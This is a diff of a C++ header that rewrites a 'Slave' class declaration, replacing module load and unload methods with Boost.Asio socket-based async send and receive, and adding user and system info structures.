@@ -6,57 +6,48 @@
 #define SLAVE_H_
 
 #include "include.h"
-#include "print.h"
+#include "module.h"
 
 
 
-enum class os_type
-{
-	windows_xp,
-	windows_10,
-	kali,
-};
-	
-
-// 目标操作系统基本信息
-struct os_info
-{
-	os_type type;
-};
-
-
-// 目标用户基本信息
 struct user_info
 {
-	char* name; // 用户名称
+	uint				uid;
+	std::string name;
+	std::string email;
 };
 
 
-// 模块信息
-struct module_info
+struct system_info
 {
-	string path;     // 路径
-	string auther;   // 作者
-	string license;  // 许可证
+	std::string osName;
+	std::string language;
+	std::string computer;
+	enum
+	{
+		x64,
+		x86
+	} architecture;
 };
 
 
 class Slave
 {
 public:
-	Slave();
+	Slave(boost::asio::ip::tcp::socket&);
 
-	bool Load(const string& mod);      // 装载模块
-	bool Unload(const string& mod);    // 卸载模块
+	void sendAsync(const std::string&);
+	void recvAsync(std::string&);
+
+	const std::string& getIpAddress();
+
+	void update();
 
 private:
-	os_info    osInfo;                 // 系统信息
-	user_info  userInfo;               // 用户信息
-	map<id_t, module_info*> module;    // 已装载的模块
-
-	vector<id_t> userId;
-
-	void OnAccept();
+	boost::asio::ip::tcp::socket&		sock;
+	user_info												userInfo;
+	system_info											osInfo;
+	map<const std::string, Module*> modules;
 };
 
 
